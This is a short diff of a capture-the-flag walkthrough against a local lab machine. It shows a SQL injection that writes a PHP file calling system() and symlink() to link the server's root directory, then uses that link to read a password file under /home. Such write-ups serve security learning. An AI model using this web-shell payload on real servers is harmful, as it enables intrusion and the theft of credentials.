@@ -17,3 +17,11 @@ SELECT '<?php  system("ln -sf / test99.php"); symlink("/", "test99.php"); ?>' in
 ```
 
 We have to go to https://192.168.56.101/forum/templates_c/suexec.php and we now have a folder called test99.php redirecting to the racine folder
+
+![](https://zekao.s-ul.eu/WqYeJeyw.png)
+
+We can now access to /home/LOOKATME/password.txt 
+
+
+
+Now, we can go to [the writeup 1](../writeup1.md) on the ftp part to coninue the challenge and get the flag
